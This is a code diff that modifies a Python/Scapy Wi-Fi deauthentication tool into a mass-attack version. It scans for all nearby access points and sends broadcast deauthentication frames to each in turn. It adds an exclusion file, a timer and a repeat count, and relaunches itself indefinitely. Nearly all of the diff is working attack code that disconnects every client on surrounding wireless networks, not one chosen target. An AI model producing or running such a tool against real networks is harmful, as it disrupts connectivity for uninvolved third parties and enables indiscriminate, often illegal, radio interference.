@@ -1,11 +1,11 @@
 #!/usr/bin/env python3
-
 import copy
 import signal
 import logging
 import argparse
 import traceback
 import pkg_resources
+import os
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)  # suppress warnings
 
@@ -16,35 +16,48 @@ from utils import *
 conf.verb = 0
 
 
-#   --------------------------------------------------------------------------------------------------------------------
-#   ....................................................................................................................
-#   .....................__      __ __  _____ __         _________                          __   __ ....................
-#   ..................../  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__..................
-#   ....................\   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \.................
-#   .....................\        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \................
-#   ......................\__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/................
-#   ....................................................................................................................
-#   Ⓒ by https://github.com/flashnuke Ⓒ................................................................................
-#   --------------------------------------------------------------------------------------------------------------------
+#   -----------------------------------------------------------------------------------------------------------------------------------------------------
+#   .....................................................................................................................................................
+#    _____                                __                             __      __ __  _____ __         _________                          __   __ 
+#   /     \   _____      ______   ______ |__| ___  __   ____            /  \    /  \__|/ ____\__|        \    __  \   ____  _____    __ ___/  |_|  |__
+#  /  \ /  \  \__  \    /  ___/  /  ___/ /  \ \  \/ / / ___ \    ______ \   \/\/   /  \   __\|  |  ______ |  |  \  \/ ___ \ \  __ \ |  |  \   __|  |  \
+# /    Y    \  / __ \_  \___ \   \___ \  |  |  \   /  \  ___/   /_____/  \        /|  ||  |  |  | /_____/ |  |__/  /\  ___/ | |__\ \|  |  /|  | |   Y  \
+# \____|____/ (______/ /______/ /______/ |__|   \_/    \_____/            \__/\__/ |__||__|  |__|         |_______/  \_____/_______/ ____/ |__| |___|__/
+#   .....................................................................................................................................................
+#   Ⓒ by https://github.com/flashnuke Ⓒ..................................................................................................................
+#   -----------------------------------------------------------------------------------------------------------------------------------------------------
 
 
 class Interceptor:
     _ABORT = False
 
-    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, bssid_name, custom_channels):
+    def __init__(self, net_iface, skip_monitor_mode_setup, kill_networkmanager, bssid_name, custom_channels, file_bssid_exclude, client_time_wait,n_deauth):
         self.interface = net_iface
+        self.killnetworkmanager=kill_networkmanager
+        self.bssid_exclude = file_bssid_exclude
+        self.client_time_to_wait=client_time_wait
         self._channel_sniff_timeout = 2
         self._scan_intv = 0.1
         self._deauth_intv = 0.1
         self._printf_res_intv = 1
-        self._ssid_str_pad = 42  # total len 80
-
+        self.csize=80  # screen columsize
+        self._ssid_str_pad = 42  # total len 42
+        self.stop_threads=False
         self._current_channel_num = None
         self._current_channel_aps = set()
 
         self.attack_loop_count = 0
-
+        
+        self.target_map: Dict[int, SSID] = dict()
         self.target_ssid: Union[SSID, None] = None
+        self.client_time_to_wait= 30	 # default time to wait clients
+        self.number_deauth= 1	 # default number of de-authentication passes per ap-scan     
+         
+        if n_deauth and int(n_deauth) > 0:
+            self.number_deauth=int(n_deauth)
+   
+        if client_time_wait and int(client_time_wait) > 0:
+            self.client_time_to_wait=int(client_time_wait)
 
         if not skip_monitor_mode_setup:
             print_info(f"Setting up monitor mode...")
@@ -62,10 +75,12 @@ class Interceptor:
 
         self._channel_range = {channel: defaultdict(dict) for channel in self._get_channels()}
         self._all_ssids: Dict[BandType, Dict[str, SSID]] = {band: dict() for band in BandType}
-
+ 	
+ 	
         self._custom_bssid_name: Union[str, None] = self.parse_custom_bssid_name(bssid_name)
         self._custom_bssid_channels: List[int] = self.parse_custom_channels(custom_channels)
         self._custom_bssid_last_ch = 0  # to avoid overlapping
+        
 
     @staticmethod
     def parse_custom_bssid_name(bssid_name: Union[None, str]) -> Union[None, str]:
@@ -146,10 +161,13 @@ class Interceptor:
 
         try:
             for idx, ch_num in enumerate(channels_to_scan):
+                ''' #Remove because the same bssid name can be in 2,4Ghz channel and 5Ghz channel
                 if self._custom_bssid_name_is_set() and self._found_custom_bssid_name() \
                         and self._current_channel_num - self._custom_bssid_last_ch > 2:
                     # make sure sniffing doesn't stop on an overlapped channel for custom BSSIDs
                     return
+                '''
+                
                 self._set_channel(ch_num)
                 print_info(f"Scanning channel {self._current_channel_num} (left -> "
                            f"{len(channels_to_scan) - (idx + 1)})", end="\r")
@@ -164,7 +182,7 @@ class Interceptor:
                 if ssid_name == self._custom_bssid_name:
                     return True
         return False
-
+        
     def _custom_bssid_name_is_set(self):
         return self._custom_bssid_name is not None
 
@@ -179,31 +197,23 @@ class Interceptor:
                f"{pref}{self._generate_ssid_str('SSID Name', 'Channel', 'MAC Address', len(pref))}")
 
         ctr = 0
-        target_map: Dict[int, SSID] = dict()
+        self.target_map: Dict[int, SSID] = dict()
         for channel, all_channel_aps in sorted(self._channel_range.items()):
             for ssid_name, ssid_obj in all_channel_aps.items():
                 ctr += 1
-                target_map[ctr] = copy.deepcopy(ssid_obj)
+                self.target_map[ctr] = copy.deepcopy(ssid_obj)
                 pref = f"[{str(ctr).rjust(3, ' ')}] "
                 preflen = len(pref)
                 pref = f"[{BOLD}{YELLOW}{str(ctr).rjust(3, ' ')}{RESET}] "
                 printf(f"{pref}{self._generate_ssid_str(ssid_obj.name, ssid_obj.channel, ssid_obj.mac_addr, preflen)}")
-        if not target_map:
-            print_error("Not APs were found, quitting...")
-            Interceptor._ABORT = True
-            exit(0)
-
+                
         printf(DELIM)
-
-        chosen = -1
-        while chosen not in target_map.keys():
-            user_input = print_input(f"Choose a target from {min(target_map.keys())} to {max(target_map.keys())}:")
-            try:
-                chosen = int(user_input)
-            except ValueError:
-                print_error("Wrong input! please enter an integer")
-
-        return target_map[chosen]
+        if not self.target_map:
+            print_error("Not APs were found ...")
+        else:
+            print (self.target_map)
+            
+        return
 
     def _generate_ssid_str(self, ssid, ch, mcaddr, preflen):
         return f"{ssid.ljust(self._ssid_str_pad - preflen, ' ')}{str(ch).ljust(3, ' ').ljust(self._ssid_str_pad // 2, ' ')}{mcaddr}"
@@ -229,6 +239,27 @@ class Interceptor:
         print_info(f"Setting up a listener for new clients...")
         sniff(prn=self._clients_sniff_cb, iface=self.interface, stop_filter=lambda p: Interceptor._ABORT is True)
 
+    def _read_bssid_to_exclude(self):
+        try:
+            if  self.bssid_exclude is not None :    
+                if os.path.isfile(self.bssid_exclude) :
+                      print_info(f"Reading file to exclude bssid {self.bssid_exclude} ...")
+                      exclude_file = open(self.bssid_exclude, "r") 
+  
+                      # reading the file 
+                      data = exclude_file.read() 
+  
+                      # replacing end splitting the text  
+                      # when newline ('\n') is seen. 
+                      data_into_list = data.split("\n")  
+                      exclude_file.close() 
+                      return data_into_list
+            return []
+        except Exception as exc:
+            print_error(f"Error Reading the file exclude bssid -> {traceback.format_exc()}")
+            
+
+        
     def _run_deauther(self):
         try:
             print_info(f"Starting de-auth loop...")
@@ -237,7 +268,7 @@ class Interceptor:
 
             rd_frm = RadioTap()
             deauth_frm = Dot11Deauth(reason=7)
-            while not Interceptor._ABORT:
+            while not self.stop_threads and not Interceptor._ABORT :
                 self.attack_loop_count += 1
                 sendp(rd_frm /
                       Dot11(addr1=BD_MACADDR, addr2=ap_mac, addr3=ap_mac) /
@@ -253,34 +284,88 @@ class Interceptor:
                           deauth_frm,
                           iface=self.interface)
             sleep(self._deauth_intv)
+            print_info(f"Stoping de-auth loop...")
+            
         except Exception as exc:
             print_error(f"Exception in deauth-loop -> {traceback.format_exc()}")
-            Interceptor._ABORT = True
-            exit(0)
+          
+            if self.killnetworkmanager:
+                print_info(f"Killing NetworkManager...")
+                if not self._kill_networkmanager():
+                    print_error(f"Failed to kill NetworkManager...")
+                            
+            if not self._enable_monitor_mode():
+                print_error(f"Monitor mode was not enabled properly")
+                raise Exception("Unable to turn on monitor mode")
+            print_info(f"Monitor mode was set up successfully")
+            sleep(self._printf_res_intv)
+
+            return
 
     def run(self):
-        self.target_ssid = self._start_initial_ap_scan()
-        ssid_ch = self.target_ssid.channel
-        print_info(f"Attacking target {self.target_ssid.name}")
-        print_info(f"Setting channel -> {ssid_ch}")
-        self._set_channel(ssid_ch)
+        list_exclude=self._read_bssid_to_exclude()
+        self._start_initial_ap_scan()
+            
+        while True and not Interceptor._ABORT:       
+            try:
+                if self.target_map:  
+     
+                    if max(self.target_map.keys()) > 0:
+                        break
+                        
+                print_info("No SSID Founds , try again")
+            except ValueError:
+                print_info("Index must be a number, try again")
+                
+        count=self.number_deauth
+        while count > 0 and not Interceptor._ABORT:  
+	        count -= 1
+	        for i in range(min(self.target_map.keys()),max(self.target_map.keys())+1,1): 
+	            
+	            if self.target_map[i].name in list_exclude: 
+	                print_info(f"Exluding BSSID : {BOLD}{self.target_map[i].name}{RESET}") 
+	                printf(f"{DELIM}")
+	
+	            else:
+	                self.target_ssid = self.target_map[i] 
+	                ssid_ch = self.target_ssid.channel  
+	                
+	                print_info(f"Attacking target {self.target_ssid.name}")
+	                print_info(f"Setting channel -> {ssid_ch}")
+	                print_info(f"MAC addr[{self.target_ssid.mac_addr}]")
+	                self._set_channel(ssid_ch)
+	
+	
+	                self.stop_threads=False
+	                for action in [self._run_deauther, self._listen_for_clients]:
+	                    t = Thread(target=action, args=tuple(), daemon=True)
+	                    t.start() 
+	
+	                start = get_time()
+	                elapse = 0
+	                printf(f"{DELIM}")                
+	                while elapse <= self.client_time_to_wait and not Interceptor._ABORT :
+	                    elapse = int (get_time() - start)
+	                    print_info(f"Net interface{self.interface.rjust(self.csize - 17, ' ')}")
+	                    print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(self.csize - 21, ' ')}{RESET}")
+	                    print_info(f"Elapsed sec {BOLD}{str(elapse).rjust(self.csize - 16, ' ')}{RESET}")
+	                    sleep(self._printf_res_intv)
+	                    print_info(f"\033[3A", end="\r") 
+	                    print_info(f"            {str('        ').rjust(self.csize - 8, ' ')}") 
+	                    print_info(f"            {str('        ').rjust(self.csize - 8, ' ')}")
+	                    print_info(f"            {str('        ').rjust(self.csize - 8, ' ')}")                       
+	                    print_info(f"\033[3A", end="\r") 
+	                 
+	
+	                clear_line(1)
+	                print_info(f"\033[1A", end="\r")                
+	                print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(self.csize - 21, ' ')}{RESET}")
 
-        for action in [self._run_deauther, self._listen_for_clients]:
-            t = Thread(target=action, args=tuple(), daemon=True)
-            t.start()
+	                self.stop_threads=True            
+	                t.join(timeout=1.0)
+	                printf(f"{DELIM}")
 
-        printf(f"{DELIM}\n")
-        start = get_time()
-        while not Interceptor._ABORT:
-            print_info(f"Target SSID{self.target_ssid.name.rjust(80 - 15, ' ')}")
-            print_info(f"Channel{str(ssid_ch).rjust(80 - 11, ' ')}")
-            print_info(f"MAC addr{self.target_ssid.mac_addr.rjust(80 - 12, ' ')}")
-            print_info(f"Net interface{self.interface.rjust(80 - 17, ' ')}")
-            print_info(f"Confirmed clients{BOLD}{str(len(self.target_ssid.clients)).rjust(80 - 21, ' ')}{RESET}")
-            print_info(f"Elapsed sec {BOLD}{str(get_time() - start).rjust(80 - 16, ' ')}{RESET}")
-            sleep(self._printf_res_intv)
-            clear_line(7)
-
+                
     @staticmethod
     def user_abort(*args):
         if not Interceptor._ABORT:
@@ -298,10 +383,15 @@ if __name__ == "__main__":
            f"1. You are running as {BOLD}root{RESET}\n"
            f"2. You kill NetworkManager (manually or by passing {BOLD}--kill{RESET})\n"
            f"3. Your wireless adapter supports {BOLD}monitor mode{RESET} (refer to docs)\n\n"
-           f"Written by {BOLD}@flashnuke{RESET}")
+           f"Written by {BOLD}@flashnuke{RESET}\n"
+           f"Mod by {BOLD}amerinoj{RESET}")
     printf(DELIM)
     restore_print()
 
+    if os.getuid() != 0:
+        printf(f"{BOLD}Exit , Please run as root{RESET}")
+        exit(1)
+	
     if "linux" not in platform:
         raise Exception(f"Unsupported operating system {platform}, only linux is supported...")
     with open("requirements.txt", "r") as reqs:
@@ -318,6 +408,12 @@ if __name__ == "__main__":
                         action='store', default=None, dest="custom_bssid", required=False)
     parser.add_argument('-c', '--channels', help='custom channels to scan, separated by a comma (i.e -> 1,3,4)',
                         metavar="ch1,ch2", action='store', default=None, dest="custom_channels", required=False)
+    parser.add_argument('-e', '--exclude', help='a file path that contain ESSID to exclude the attack',
+                        action='store', dest="file_bssid_exclude", required=False)
+    parser.add_argument('-t', '--time', help='time to find clients, default 30',
+                        action='store', dest="client_time_wait", required=False)
+    parser.add_argument('-n', '--number', help='number of de-authentications per ap-scan',
+                        action='store', dest="n_deauth", required=False)                          
     pargs = parser.parse_args()
 
     invalidate_print()  # after arg parsing
@@ -325,5 +421,15 @@ if __name__ == "__main__":
                            skip_monitor_mode_setup=pargs.skip_monitormode,
                            kill_networkmanager=pargs.kill_networkmanager,
                            bssid_name=pargs.custom_bssid,
-                           custom_channels=pargs.custom_channels)
-    attacker.run()
+                           custom_channels=pargs.custom_channels,
+                           file_bssid_exclude=pargs.file_bssid_exclude,
+                           client_time_wait=pargs.client_time_wait,
+                           n_deauth=pargs.n_deauth)
+
+    while  not Interceptor._ABORT :
+        try:                 
+            attacker.run()
+        except Exception as exc:
+            print_error(f"Exception in attacker-run -> {traceback.format_exc()}")
+    
+    
